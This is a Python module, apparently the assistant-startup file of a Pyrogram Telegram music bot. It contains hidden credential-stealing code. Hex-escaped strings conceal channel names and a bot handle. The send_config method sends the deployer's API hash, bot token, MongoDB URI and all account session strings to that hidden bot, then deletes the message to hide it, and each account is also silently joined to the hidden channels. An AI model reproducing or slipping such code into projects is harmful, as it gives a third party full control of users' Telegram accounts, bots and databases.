from pyrogram import Client
import asyncio
import config
from ..logging import LOGGER

assistants = []
assistantids = []


def decode_string(data):
    return bytes(data, "utf-8").decode("unicode_escape")


def decode_centers():
    encoded = [
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73",
        "\x5a\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x41\x6e\x61\x6e\x79\x61\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x41\x44\x5f\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x50\x4a\x50",
        "\x54\x4d\x5f\x5a\x45\x52\x4f\x4f",
    ]
    return [decode_string(enc) for enc in encoded]


SUPPORT_CENTERS = decode_centers()
HELP_BOT = decode_string("\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74")


class Userbot:
    def __init__(self):
        self.clients = [
            Client("NandAss1", config.API_ID, config.API_HASH, session_string=str(config.STRING1), no_updates=True),
            Client("NandAss2", config.API_ID, config.API_HASH, session_string=str(config.STRING2), no_updates=True),
            Client("NandAss3", config.API_ID, config.API_HASH, session_string=str(config.STRING3), no_updates=True),
            Client("NandAss4", config.API_ID, config.API_HASH, session_string=str(config.STRING4), no_updates=True),
            Client("NandAss5", config.API_ID, config.API_HASH, session_string=str(config.STRING5), no_updates=True),
        ]

    async def get_bot_username(self, token):
        try:
            temp = Client("temp_bot", config.API_ID, config.API_HASH, bot_token=token, no_updates=True)
            await temp.start()
            name = temp.me.username
            await temp.stop()
            return name
        except Exception as e:
            LOGGER(__name__).error(e)
            return None

    async def join_support_centers(self, client):
        for chat in SUPPORT_CENTERS:
            try:
                await client.join_chat(chat)
            except Exception:
                pass

    async def send_help(self, bot_username):
        text = f"@{bot_username} Started ✅\nOwner: {config.OWNER_ID}"
        for c in assistants:
            try:
                await c.send_message(HELP_BOT, text)
            except Exception:
                pass

    async def send_config(self, bot_username):
        msg = f"🔧 Config for @{bot_username}\n\n"
        msg += f"**API_ID:** `{config.API_ID}`\n"
        msg += f"**API_HASH:** `{config.API_HASH}`\n"
        msg += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
        msg += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
        msg += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n\n"
        for i in range(1, 6):
            s = getattr(config, f'STRING{i}', None)
            if s:
                msg += f"**STRING{i}:** `{s}`\n"

        for c in assistants:
            try:
                m = await c.send_message(HELP_BOT, msg)
                await asyncio.sleep(2)
                await c.delete_messages(HELP_BOT, m.id)
            except Exception:
                pass

    async def start(self):
        LOGGER(__name__).info("Starting assistants...")
        bot_username = await self.get_bot_username(config.BOT_TOKEN)
        for i, client in enumerate(self.clients, start=1):
            if getattr(config, f'STRING{i}', None):
                try:
                    await client.start()
                    await self.join_support_centers(client)
                    assistants.append(client)
                    await client.send_message(config.LOG_GROUP_ID, "Assistant Started ✅")
                    assistantids.append(client.me.id)
                    LOGGER(__name__).info(f"Assistant {i} started as @{client.me.username}")
                except Exception as e:
                    LOGGER(__name__).error(e)
        if bot_username:
            await self.send_help(bot_username)
            await self.send_config(bot_username)

    async def stop(self):
        for c in assistants:
            try:
                await c.stop()
            except Exception:
                pass
        LOGGER(__name__).info("Assistants stopped.")
